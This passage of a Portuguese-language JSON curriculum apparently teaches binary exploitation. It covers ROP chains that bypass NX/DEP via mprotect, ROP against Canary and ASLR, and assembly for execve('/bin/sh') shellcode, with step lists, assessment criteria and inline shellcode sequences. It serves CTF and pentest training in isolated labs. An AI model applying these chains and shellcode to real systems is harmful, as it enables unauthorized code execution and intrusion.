                                "Payload crafted spawna shell interativo via ROP sem NX",
                                "Explicar chain ROP passo a passo em GDB",
                                "Modificar chain para executar comando customizado (ex: cat flag.txt)",
                                "Identificar offset e 5 gadgets manualmente sem ferramentas",
                                "Adaptar exploit para versão remota com leak de libc",
                                "Documentar script pwntools funcional e reproduzível"
                              ],
                              "assessmentCriteria": [
                                "Precisão no cálculo de offset e construção de chain (sem crashes desnecessários)",
                                "Uso correto de pwntools para automação e debugging",
                                "Compreensão de bypass NX via ROP com explicação técnica",
                                "Identificação de pelo menos 3 gadgets e sua função na chain",
                                "Aplicação em cenário realista (local/remoto) com verificação de shell",
                                "Análise de erros comuns e mitigações (ex: Canary, ASLR)"
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86/x64: Leitura de gadgets e registradores",
                                "Programação em C: Entendimento de stack e funções vulneráveis",
                                "Python avançado: Uso de bibliotecas pwntools para automação",
                                "Análise reversa: Ferramentas como GDB, ROPgadget, radare2",
                                "Redes e sistemas: Adaptação para exploits remotos via sockets"
                              ],
                              "realWorldApplication": "Em pentesting e bug bounties, ROP é usado para explorar binários sem NX/DEP, como em serviços web vulneráveis (ex: CGI scripts), CTFs como pwn.college, e compreensão de defesas modernas (CFI, RELRO) em auditorias de segurança."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.3.2",
                            "name": "Contornar DEP/NX com ROP",
                            "description": "Usar ROP para chamar mprotect() ou mmap() alterando permissões de páginas (RWX), permitindo execução de shellcode injetado, em cenários reais com proteções ativadas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Teste com DEP/NX Ativado",
                                  "subSteps": [
                                    "Compile um binário vulnerável em C com buffer overflow, usando flags como -fno-stack-protector -z execstack para simular, mas ative DEP via linker (-z noexecstack).",
                                    "Use gdb-peda ou pwndbg para depuração e verifique ASLR/DEP com checksec.",
                                    "Identifique o endereço da shellcode injetada (ex: em heap ou stack) e confirme permissões NX com vmmap ou info proc mappings.",
                                    "Prepare shellcode simples (ex: execve(/bin/sh)) usando msfvenom ou pwntools.",
                                    "Desative ASLR temporariamente com echo 0 > /proc/sys/kernel/randomize_va_space para facilitar ROP inicial."
                                  ],
                                  "verification": "Execute checksec no binário e confirme 'NX: Yes'; verifique em gdb que página da shellcode é não-executável.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": "GCC, GDB com PEDA/Pwndbg, checksec.sh, pwntools, binário vulnerável exemplo (ex: de exploit-exercises).",
                                  "tips": "Use Docker com Ubuntu para isolar ambiente e evitar impactos no host.",
                                  "learningObjective": "Compreender configuração de proteções modernas e preparar cenário realista para bypass.",
                                  "commonMistakes": "Esquecer de recompilar com proteções corretas; confundir stack com heap para shellcode."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Gadgets ROP para Chamar mprotect()",
                                  "subSteps": [
                                    "Use ROPgadget ou ROPper para escanear binário/libc por gadgets: pop rdi; pop rsi; pop rdx; ret; etc.",
                                    "Localize endereço de mprotect() via gdb (info functions) ou ld.so cache.",
                                    "Encontre gadgets para setup de argumentos: addr_shellcode (rdi), tamanho_pagina (rsi=0x1000), PROT_READ|PROT_WRITE|PROT_EXEC (rdx=7).",
                                    "Valide gadgets em ROPgadget --binary vuln --only 'pop|ret' e anote endereços em little-endian.",
                                    "Considere gadgets para alinhamento de stack (ex: pop rbp; ret)."
                                  ],
                                  "verification": "Liste pelo menos 5 gadgets válidos e endereço exato de mprotect(); teste chain parcial em gdb.",
                                  "estimatedTime": "45-60 minutos",
                                  "materials": "ROPgadget, ROPper, libc local, gdb, one_gadget para inspiração.",
                                  "tips": "Filtre gadgets por arquitetura (x86_64) e priorize os da libc para estabilidade.",
                                  "learningObjective": "Dominar busca e validação de gadgets ROP para funções libc como mprotect.",
                                  "commonMistakes": "Usar gadgets corrompidos ou ignorar bad chars (ex: null bytes); não alinhar stack pointer."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir e Testar Chain ROP Completa",
                                  "subSteps": [
                                    "Monte chain: [padding] + [rdi=addr_shellcode] + [rsi=0x1000] + [rdx=7] + [mprotect_addr] + [addr_shellcode].",
                                    "Use pwntools ou Python para gerar payload: ROP(gnu.readelf).",
                                    "Teste em gdb: set args $(python -c 'print payload'); run e stepi pela chain.",
                                    "Ajuste para leaks se ASLR ativo (primeiro leak libc base via puts).",
                                    "Inclua gadget para jmp para shellcode após mprotect."
                                  ],
                                  "verification": "Em gdb, observe call mprotect() alterando permissões (vmmap antes/depois); shellcode executa sem crash.",
                                  "estimatedTime": "60-90 minutos",
                                  "materials": "Pwntools, Python, gdb scripts para breakpoints em mprotect.",
                                  "tips": "Use cyclic() para encontrar offset exato do RIP overwrite.",
                                  "learningObjective": "Construir chains ROP funcionais para alteração de permissões de memória.",
                                  "commonMistakes": "Argumentos errados para mprotect (ex: rdx=3 em vez de 7); overflow prematuro da stack."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar Exploit Completo e Verificar Bypass",
                                  "subSteps": [
                                    "Gere payload final com shellcode no final da chain.",
                                    "Execute ./vuln $(python payload.py) e confirme shell interativa.",
                                    "Reative ASLR e teste com leak de libc base via ROP inicial (printf).",
                                    "Analise com strace ou ltrace para confirmar syscalls mprotect/mmap.",
                                    "Documente offsets e gadgets para reprodutibilidade."
                                  ],
                                  "verification": "Obtenha shell estável ($id ou whoami); confirme página agora RWX via gdb attach.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": "Binário final, Python exploit script.",
                                  "tips": "Salve payload em arquivo e use cat para input se necessário.",
                                  "learningObjective": "Validar bypass DEP/NX em cenário realista com proteções parciais.",
                                  "commonMistakes": "Não limpar stack após ROP; falhar em reativar ASLR para teste completo."
                                }
                              ],
                              "practicalExample": "Em um binário vulnerable 'ret2libc' com DEP, buffer overflow em gets() permite ROP chain: pop rdi; ret; (addr_heap_shellcode); pop rsi; ret; (0x1000); pop rdx; ret; (7); mprotect; jmp addr_shellcode. Shellcode: \\x31\\xc0... execve('/bin/sh'). Payload resulta em shell após mprotect tornar heap RWX.",
                              "finalVerifications": [
                                "mprotect() é chamado com args corretos (ver logs gdb).",
                                "Permissões da página mudam para RWX (vmmap).",
                                "Shellcode executa sem SIGSEGV.",
                                "Shell interativa obtida ($ps aux).",
                                "Exploit funciona com ASLR parcial.",
                                "Nenhuma detecção por proteções adicionais (ex: Canary bypass via ROP)."
                              ],
                              "assessmentCriteria": [
                                "Chain ROP usa gadgets válidos sem bad chars.",
                                "Argumentos mprotect precisos e página alinhada.",
                                "Exploit roda em <5 min com gdb.",
                                "Documentação inclui offsets e script Python reproduzível.",
                                "Adaptação para mmap() se mprotect indisponível.",
                                "Análise de falhas comuns resolvida."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86_64 (gadgets e registradores).",
                                "Sistemas Operacionais (gerenciamento de memória, syscalls).",
                                "Programação em C/Python (exploits e tools).",
                                "Redes (aplicável a buffer overflows remotos).",
                                "Criptografia (leaks de endereços via side-channels)."
                              ],
                              "realWorldApplication": "Bypass DEP em exploits reais como EternalBlue (WannaCry) ou CTF challenges; defensivamente, entender para hardening (RELRO, PIE) e detecção IDS/EDR de ROP chains."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.3.3",
                            "name": "Testar ROP em ambientes protegidos",
                            "description": "Validar chains em binários com Canary, ASLR e DEP usando GDB/PEDA, ajustando para leaks e pivots, referenciando técnicas de Practical Malware Analysis e Practical Binary Analysis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente de teste com proteções ativadas",
                                  "subSteps": [
                                    "Compilar um binário vulnerável a buffer overflow usando flags como -fstack-protector-strong, -pie, -no-pie para ASLR e DEP",
                                    "Verificar proteções com checksec.sh ou readelf para confirmar Canary, ASLR e NX ativados",
                                    "Instalar e configurar GDB com PEDA (Pedagogic Debugger for Assembly)",
                                    "Preparar payload inicial simples sem ROP para validar overflow básico",
                                    "Executar binário em ambiente controlado (ex: VM Linux)"
                                  ],
                                  "verification": "Executar 'checksec ./binary' e confirmar proteções ativas; GDB inicia sem erros com PEDA",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "GCC compiler",
                                    "checksec.sh",
                                    "GDB",
                                    "PEDA plugin",
                                    "Livro Practical Binary Analysis (cap. ROP basics)"
                                  ],
                                  "tips": "Use Docker para isolar ambiente e evitar contaminação do host",
                                  "learningObjective": "Configurar e validar proteções modernas em binários para simular cenários reais",
                                  "commonMistakes": [
                                    "Esquecer flag -fno-stack-check",
                                    "Não ativar ASLR no kernel com sysctl",
                                    "Usar binários pré-compilados sem verificação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar proteções e identificar leaks para bypass",
                                  "subSteps": [
                                    "Identificar leak de Canary via format string ou partial overwrite",
                                    "Leak ASLR base address usando got leak ou info leak primitiva",
                                    "Analisar seções binário com objdump ou Ghidra para pontos de leak",
                                    "Testar DEP com execve shellcode e confirmar crash (SIGSEGV)",
                                    "Referenciar técnicas de Practical Malware Analysis (cap. Anti-debugging e leaks)"
                                  ],
                                  "verification": "Obter Canary value consistente e partial ASLR leak via GDB watchpoints",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "GDB/PEDA",
                                    "ROPgadget",
                                    "pwndbg (opcional)",
                                    "Practical Malware Analysis (cap. 12)"
                                  ],
                                  "tips": "Use 'pattern_create' do pwntools para offsets precisos em leaks",
                                  "learningObjective": "Desenvolver primitivas de leak para contornar randomizações e canaries",
                                  "commonMistakes": [
                                    "Assumir leak total sem partial overwrites",
                                    "Ignorar W^X em leaks de ASLR",
                                    "Não pausar ASLR durante debug inicial"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Localizar e selecionar gadgets ROP adequados",
                                  "subSteps": [
                                    "Executar ROPgadget --binary binary para listar gadgets",
                                    "Filtrar gadgets para pop/ret, read/write, syscall (ex: execve)",
                                    "Ajustar endereços para ASLR usando leak de base (vdso ou libc)",
                                    "Construir chain mínima: pop rdi; pop rsi; pop rdx; execve(/bin/sh)",
                                    "Validar gadgets em GDB com 'x/i $pc' após pivot"
                                  ],
                                  "verification": "Chain de gadgets alinha corretamente em GDB stepi sem crash prematuro",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "ROPgadget",
                                    "ropper",
                                    "GDB/PEDA",
                                    "Practical Binary Analysis (cap. 10-11)"
                                  ],
                                  "tips": "Priorize gadgets de libc se binário pequeno; use 'one_gadget' para RCE rápida",
                                  "learningObjective": "Selecionar e chainar gadgets ROP resilientes a proteções",
                                  "commonMistakes": [
                                    "Gadgets inválidos pós-ASLR",
                                    "Bad chars em payloads corrompendo gadgets",
                                    "Não alinhar stack para 8 bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir e testar chain ROP com bypasses integrados",
                                  "subSteps": [
                                    "Integrar leak de Canary no payload inicial, seguido de ROP chain",
                                    "Pivot stack para região RW usando ret2plt ou mprotect",
                                    "Testar em GDB: set disable-randomization off; run payload",
                                    "Debug com PEDA: usar 'pattern offset', 'checksec', 'context' para análise",
                                    "Iterar ajustes para pivots (ex: ret2csu para argumentos)"
                                  ],
                                  "verification": "Shell interativa spawna (/bin/sh) apesar de proteções",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "pwntools para scripting",
                                    "GDB/PEDA",
                                    "Livros PMA e PBA para exemplos de pivots"
                                  ],
                                  "tips": "Script Python com pwntools para automação de payloads dinâmicos",
                                  "learningObjective": "Integrar bypasses em chains ROP funcionais",
                                  "commonMistakes": [
                                    "Overflow não exato pós-leak",
                                    "Pivot sem alinhamento RSP",
                                    "Esquecer ROP para system() args"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar, depurar e documentar exploit final",
                                  "subSteps": [
                                    "Executar sem GDB para confirmar ASLR full bypass",
                                    "Testar múltiplas runs para consistência",
                                    "Documentar chain com offsets, gadgets e bypass logic",
                                    "Analisar falhas com core dumps (ulimit -c)",
                                    "Comparar com exemplos de PMA/PBA para refinamentos"
                                  ],
                                  "verification": "Exploit succeeds 100% em 10 runs com ASLR on; shell ganha tty",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "GDB",
                                    "PEDA",
                                    "pwntools",
                                    "checksec para pós-análise"
                                  ],
                                  "tips": "Use 'gef' ou pwndbg para visualizações avançadas em depuração",
                                  "learningObjective": "Garantir robustez de ROP em cenários protegidos reais",
                                  "commonMistakes": [
                                    "Testar só com ASLR off",
                                    "Não checar DEP bypass via ROP",
                                    "Documentação incompleta de leaks"
                                  ]
                                }
                              ],
                              "practicalExample": "Use o binário 'ret2csu' do ROP Emporium: compile com proteções, leak canary via printf, leak libc base, chain ROP para system('/bin/sh') usando gadgets de csu_init.",
                              "finalVerifications": [
                                "Binário crasha corretamente sem bypasses (Canary fail, ASLR segfault)",
                                "Leak de Canary e ASLR obtidos consistentemente",
                                "ROP chain executa shell sem GDB (ASLR on)",
                                "PEDA mostra stack pivot e gadgets alinhados",
                                "Exploit roda em VM isolada sem detecção anti-debug",
                                "Documentação inclui offsets exatos e referências PMA/PBA"
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de proteções (checksec 100%)",
                                "Sucesso em leaks (Canary + ASLR base em <5 iterações)",
                                "Chain ROP mínima e funcional (≤20 gadgets)",
                                "Depuração eficiente com GDB/PEDA (identifica issues em <30min)",
                                "Robustez: 90%+ sucesso rate com ASLR/DEP",
                                "Integração de pivots para argumentos complexos"
                              ],
                              "crossCurricularConnections": [
                                "Assembly Language: Leitura de gadgets e disassembly",
                                "Operating Systems: Entendimento de ASLR, DEP e stack guards",
                                "Malware Analysis: Técnicas de leak e anti-proteção (PMA)",
                                "Reverse Engineering: Uso de Ghidra/IDA para análise binária (PBA)",
                                "Scripting: Python/pwntools para automação de exploits"
                              ],
                              "realWorldApplication": "Em pentests e CTFs, testar ROP em binários protegidos simula exploração de serviços reais como web servers vulneráveis, permitindo desenvolvimento de exploits para relatórios de vulnerabilidade e mitigação de NX/ASLR gaps."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.4",
                    "name": "Geração e Injeção de Código em Assembly",
                    "description": "Processo de criação de shellcodes em assembly 32/64 bits e técnicas de injeção via overflows ou outras vulnerabilidades.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.4.1",
                        "name": "Fundamentos de Assembly 32/64 bits",
                        "description": "Conceitos básicos de linguagem assembly para arquiteturas 32 e 64 bits, incluindo registradores, instruções de controle de fluxo, acesso a memória e chamadas de sistema.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.4.1.1",
                            "name": "Identificar registradores e instruções básicas em Assembly x86/x64",
                            "description": "Reconhecer e diferenciar registradores (EAX, RAX, etc.) e instruções comuns como MOV, ADD, JMP em assembly 32 e 64 bits, com foco em posicion independent code para shellcodes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Registradores em x86 (32-bit)",
                                  "subSteps": [
                                    "Liste os registradores de propósito geral: EAX, EBX, ECX, EDX e suas versões de 16/8 bits (AX, AH, etc.).",
                                    "Identifique registradores especiais: EIP (Instruction Pointer), ESP (Stack Pointer), EBP (Base Pointer), ESI, EDI.",
                                    "Estude registradores de flags (EFLAGS) e de segmento (CS, DS, SS, ES, FS, GS).",
                                    "Memorize tamanhos: 32 bits para modo protegido.",
                                    "Pratique visualizando um diagrama de registradores x86."
                                  ],
                                  "verification": "Desenhe um diagrama completo dos registradores x86-32 e rotule cada um corretamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Diagrama de registradores x86 (online ou impresso)",
                                    "Documentação Intel x86 manuals (PDF)",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": "Use mnemônicos: EAX para acumulador, ECX para contadores.",
                                  "learningObjective": "Reconhecer e categorizar todos os registradores principais em assembly x86-32.",
                                  "commonMistakes": [
                                    "Confundir registradores de 32-bit com 64-bit (ex: EAX vs RAX)",
                                    "Ignorar registradores de segmento em shellcodes",
                                    "Esquecer EIP como PC"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Registradores em x64 (64-bit) e Diferenças",
                                  "subSteps": [
                                    "Liste registradores de 64-bit: RAX, RBX, RCX, RDX, R8-R15.",
                                    "Identifique extensões: RFLAGS, RIP, RSP, RBP, RSI, RDI, R8-R15.",
                                    "Compare com x86: Novos registradores (R8-R15), tamanhos maiores, sem registradores de segmento visíveis.",
                                    "Estude convenções de chamada: Argumentos em RDI, RSI, RDX, RCX, R8, R9.",
                                    "Pratique convertendo código x86 para x64."
                                  ],
                                  "verification": "Converta um snippet x86-32 para x64, ajustando registradores.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Documentação AMD64 manuals",
                                    "Ferramenta online como Godbolt para ver assembly gerado",
                                    "Emulador como QEMU"
                                  ],
                                  "tips": "Lembre: x64 usa mais registradores para otimização.",
                                  "learningObjective": "Diferenciar registradores x86 vs x64 e entender extensões.",
                                  "commonMistakes": [
                                    "Usar EAX em x64 sem prefixo (use RAX)",
                                    "Confundir convenções de chamada x86 vs x64",
                                    "Esquecer RIP como position-dependent"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Instruções Básicas Comuns",
                                  "subSteps": [
                                    "Estude MOV: Movimentação de dados (MOV reg, imm; MOV reg, reg; MOV reg, [mem]).",
                                    "Analise aritméticas: ADD, SUB, INC, DEC e impactos em flags.",
                                    "Compreenda controle de fluxo: JMP (incondicional), JZ, JNZ, JE, etc.",
                                    "Pratique decodificando opcodes básicos em hex.",
                                    "Liste sintaxe para x86 e x64 (ex: MOV EAX, 0x41 vs MOV RAX, 0x41)."
                                  ],
                                  "verification": "Decodifique 5 instruções hex para mnemonic e registradores.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Cheat sheet de instruções x86/x64",
                                    "Disassembler online como CyberChef",
                                    "Livro 'Practical Reverse Engineering'"
                                  ],
                                  "tips": "Foco em operandos: imm, reg, mem para PIC.",
                                  "learningObjective": "Reconhecer sintaxe e função de MOV, ADD, JMP em ambos arquiteturas.",
                                  "commonMistakes": [
                                    "Confundir ADD com MOV (ADD altera flags)",
                                    "Ignorar tamanhos de operando (BYTE, WORD, DWORD, QWORD)",
                                    "Esquecer JMP relativo para PIC"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Conceitos em Position Independent Code (PIC) para Shellcodes",
                                  "subSteps": [
                                    "Entenda PIC: Evite endereços absolutos; use RIP-relativo ou registradores.",
                                    "Analise shellcode exemplo: XOR EAX,EAX; MOV AL,0x41; INT 0x80 (x86 syscall).",
                                    "Construa shellcode PIC: Use CALL/POP para obter RIP, offsets relativos.",
                                    "Compare x86 vs x64: Syscalls via SYSCALL, registradores para args.",
                                    "Teste em debugger: Injete e execute sem relocação."
                                  ],
                                  "verification": "Escreva um shellcode PIC simples que exit(0) e identifique registradores/instruções.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Debugger como x64dbg ou GDB",
                                    "Exemplos de shellcodes do Exploit-DB",
                                    "Ambiente virtual Linux para testes"
                                  ],
                                  "tips": "Sempre use JMP/CALL-POP para PIC shellcodes.",
                                  "learningObjective": "Identificar elementos PIC em shellcodes usando registradores e instruções básicas.",
                                  "commonMistakes": [
                                    "Usar MOV reg, abs_addr (não PIC)",
                                    "Hardcode syscalls sem verificação de arch",
                                    "Ignorar null bytes em shellcodes"
                                  ]
                                }
                              ],
                              "practicalExample": "Shellcode PIC x86-32 para execve('/bin/sh'): XOR ECX,ECX; MUL ECX (clear EAX/EBX/EDX); PUSH 0x68732f2f; PUSH 0x6e69622f; MOV EBX,ESP; PUSH ECX; PUSH EBX; MOV EAX,11; INT 0x80. Identifique: Registradores EAX(11=syscall), EBX(path), ECX(0); Instruções MOV, PUSH, XOR.",
                              "finalVerifications": [
                                "Liste 8 registradores x86-32 e 10 x64 com funções.",
                                "Decodifique um shellcode de 20 bytes identificando todos registradores e instruções.",
                                "Explique por que JMP relativo é PIC e MOV abs não.",
                                "Diferencie sintaxe MOV em x86 vs x64 com exemplo.",
                                "Construa instrução ADD que set flags ZF=1.",
                                "Identifique registradores usados em convenção de chamada x64."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de registradores (100% corretos).",
                                "Correta decodificação de instruções (sem erros de sintaxe).",
                                "Demonstração de PIC vs non-PIC em exemplos.",
                                "Compreensão de diferenças 32/64 bits (>80% acerto).",
                                "Uso correto de verificações e tips em prática.",
                                "Criatividade em shellcode simples funcional."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Assembly gerado por gcc -S.",
                                "Sistemas Operacionais: Syscalls e registradores de args.",
                                "Segurança da Informação: Reverse engineering de binários com IDA/Ghidra.",
                                "Arquitetura de Computadores: Pipeline e flags em CPU.",
                                "Desenvolvimento de Exploits: ROP chains usando registradores."
                              ],
                              "realWorldApplication": "Em análise de malware e desenvolvimento de exploits, identificar registradores e instruções PIC permite escrever shellcodes que executam em qualquer endereço de memória, essenciais para bypass de ASLR em ataques de injeção de código como buffer overflows."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.1.2",
                            "name": "Implementar chamadas de sistema para execução de comandos",
                            "description": "Escrever código assembly para chamadas de sistema como execve(/bin/sh) usando int 0x80 em 32 bits e syscall em 64 bits, incluindo preparação de argumentos em registradores.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender convenções de chamadas de sistema em Linux 32/64 bits",
                                  "subSteps": [
                                    "Estude a syscall execve: número 11 em 32 bits (eax=11), número 59 em 64 bits (rax=59).",
                                    "Aprenda configuração de registradores: 32 bits usa ebx (path), ecx (argv), edx (envp); 64 bits usa rdi, rsi, rdx.",
                                    "Identifique interrupção int 0x80 para 32 bits e instrução syscall para 64 bits.",
                                    "Revise alinhamento de memória e terminação de strings com NULL.",
                                    "Pratique leitura de man pages: man 2 execve e man 2 syscall."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito as diferenças entre 32 e 64 bits, listando registradores corretos.",
                                  "estimatedTime": "45 min",
                                  "materials": [
                                    "Documentação Linux syscall tables (kernel.org)",
                                    "Man pages (execve, syscall)",
                                    "Editor de texto"
                                  ],
                                  "tips": "Use diagramas para mapear registradores a argumentos; memorize apenas execve primeiro.",
                                  "learningObjective": "Compreender as convenções de ABI para syscalls em x86 e x86_64.",
                                  "commonMistakes": [
                                    "Confundir números de syscall entre arquiteturas",
                                    "Esquecer NULL terminators",
                                    "Ignorar alinhamento de stack"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar string e argumentos para execve(/bin/sh)",
                                  "subSteps": [
                                    "Defina a string '/bin/sh\\x00' em assembly (db directive).",
                                    "Crie ponteiros para argv (ptr_sh, 0) e envp (0).",
                                    "Em 32 bits: mov ebx, ptr_sh; mov ecx, argv_ptr; mov edx, 0.",
                                    "Em 64 bits: mov rdi, ptr_sh; mov rsi, argv_ptr; mov rdx, 0.",
                                    "Teste em um snippet simples imprimindo ponteiros com printf assembly."
                                  ],
                                  "verification": "Compile um assembly que imprime o endereço da string e confirme com gdb.",
                                  "estimatedTime": "30 min",
                                  "materials": [
                                    "NASM ou GAS assembler",
                                    "GDB debugger",
                                    "Linux VM 32/64 bits"
                                  ],
                                  "tips": "Use .section .data para strings; sempre inclua NULL byte explicitamente.",
                                  "learningObjective": "Preparar corretamente argumentos em memória e registradores para execve.",
                                  "commonMistakes": [
                                    "String sem NULL terminator causando segfault",
                                    "Ponteiros incorretos para argv/envp",
                                    "Não alinhar dados"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Escrever código assembly para chamadas int 0x80 (32 bits) e syscall (64 bits)",
                                  "subSteps": [
                                    "_global _start para 32 bits: mov eax, 11; int 0x80.",
                                    "_global _start para 64 bits: mov rax, 59; syscall.",
                                    "Adicione exit syscall para limpeza: eax/rax=1, int 0x80/syscall.",
                                    "Monte shellcode completo sem dependências externas.",
                                    "Escreva nas duas arquiteturas lado a lado para comparação."
                                  ],
                                  "verification": "Assemble e linke o código; execute e veja shell spawnar.",
                                  "estimatedTime": "60 min",
                                  "materials": [
                                    "NASM: nasm -f elf32/elf64",
                                    "ld linker",
                                    "strace para tracear syscalls"
                                  ],
                                  "tips": "Comece com 32 bits (mais simples); use objdump -d para disassemble.",
                                  "learningObjective": "Implementar shellcode funcional para execve em ambas arquiteturas.",
                                  "commonMistakes": [
                                    "Usar syscall em 32 bits ou int 0x80 em 64 bits",
                                    "Ordem errada de registradores",
                                    "Falta de _start label"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, depurar e otimizar o shellcode",
                                  "subSteps": [
                                    "Compile: nasm -f elf32 shell.asm -o shell.o; ld -m elf_i386 shell.o.",
                                    "Execute com strace para confirmar execve(/bin/sh).",
                                    "Use gdb: breakpoints em int 0x80/syscall, examine registradores.",
                                    "Otimize para shellcode nulo-livre (evite \\x00).",
                                    "Teste em ambiente restrito (ex: noexec off)."
                                  ],
                                  "verification": "Shell interativo spawna sem erros; strace mostra execve correto.",
                                  "estimatedTime": "45 min",
                                  "materials": [
                                    "GDB",
                                    "strace",
                                    "objdump",
                                    "Ambiente Linux isolado"
                                  ],
                                  "tips": "rode como ./shell; Ctrl+C para sair; use python para injetar se necessário.",
                                  "learningObjective": "Depurar e validar chamadas de sistema em cenários reais.",
                                  "commonMistakes": [
                                    "Segfault por registradores errados",
                                    "Política SELinux/AppArmor bloqueando",
                                    "Linker flags erradas"
                                  ]
                                }
                              ],
                              "practicalExample": "Shellcode 32 bits: db '/bin/sh',0; ptr equ $; mov ebx,ptr; xor ecx,ecx; xor edx,edx; mov al,11; int 0x80. Compile e execute para spawnar shell.",
                              "finalVerifications": [
                                "Código 32 bits spawna /bin/sh via int 0x80 confirmado por strace.",
                                "Código 64 bits spawna /bin/sh via syscall confirmado por strace.",
                                "GDB mostra registradores corretos pré-syscall.",
                                "Shellcode é <50 bytes e executável standalone.",
                                "Funciona em VM limpa sem privilégios root.",
                                "Disassembly via objdump combina com código fonte."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de registradores e números de syscall.",
                                "String e ponteiros preparados corretamente sem vazamentos.",
                                "Código compila e executa sem erros em ambas arquiteturas.",
                                "Uso correto de ferramentas de debug (gdb, strace).",
                                "Otimização básica (ex: shellcode compacto).",
                                "Explicação clara das diferenças 32/64 bits."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entendimento de kernel interface e process creation.",
                                "Programação de Baixo Nível: Assembly x86/x86_64 e ABI conventions.",
                                "Segurança da Informação: Base para buffer overflows e ROP exploits.",
                                "Engenharia Reversa: Análise de shellcodes em binários maliciosos.",
                                "Redes e CTFs: Payloads em pwn challenges."
                              ],
                              "realWorldApplication": "Desenvolvimento de exploits em pentesting (ex: CTF pwnables), análise de malware que usa syscalls para persistence, criação de payloads em ferramentas como Metasploit, e compreensão de defesas como seccomp que filtram syscalls."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.1.3",
                            "name": "Manipular acesso a memória em shellcodes",
                            "description": "Desenvolver instruções para leitura/escrita em memória sem endereços absolutos, evitando bytes nulos (\\x00) e utilizando técnicas de posicionamento independente.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender problemas de endereços absolutos e bytes nulos em shellcodes",
                                  "subSteps": [
                                    "Estudar shellcodes posicionamento-dependentes e independentes de endereço (PIC).",
                                    "Identificar bytes nulos (\\x00) em instruções de MOV com endereços absolutos.",
                                    "Analisar impacto de bytes nulos em funções como execve ou string-based loaders.",
                                    "Examinar exemplos de shellcodes falhando devido a nulos via hexdump.",
                                    "Comparar assembly 32/64 bits e suas peculiaridades em registros."
                                  ],
                                  "verification": "Gerar um shellcode simples com endereço absoluto e verificar presença de \\x00 via objdump ou hexdump.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de texto (Vim/Nano)",
                                    "Assemblador NASM",
                                    "Ferramenta hexdump ou xxd"
                                  ],
                                  "tips": "Sempre use hexdump -C para visualizar bytes nulos claramente.",
                                  "learningObjective": "Entender as limitações de endereços absolutos e o porquê de técnicas PIC serem essenciais.",
                                  "commonMistakes": [
                                    "Ignorar diferenças entre 32 e 64 bits",
                                    "Não testar em little-endian",
                                    "Confundir null bytes com terminadores de string"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Aprender técnicas para obter endereços relativos usando registradores",
                                  "subSteps": [
                                    "Explorar uso de ESP (stack pointer) para base relativa em injeções de buffer overflow.",
                                    "Implementar CALL/POP para capturar endereço de retorno e calcular offsets.",
                                    "Estudar uso de EBP para frames de pilha e offsets negativos/positivos.",
                                    "Praticar com JMP-CALL-POP chains para encontrar gadgets sem nulos.",
                                    "Testar em ambiente Linux x86 com gdb para validar offsets."
                                  ],
                                  "verification": "Escrever snippet assembly que usa ESP para acessar [ESP+8] e disassemblar para confirmar ausência de nulos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "NASM",
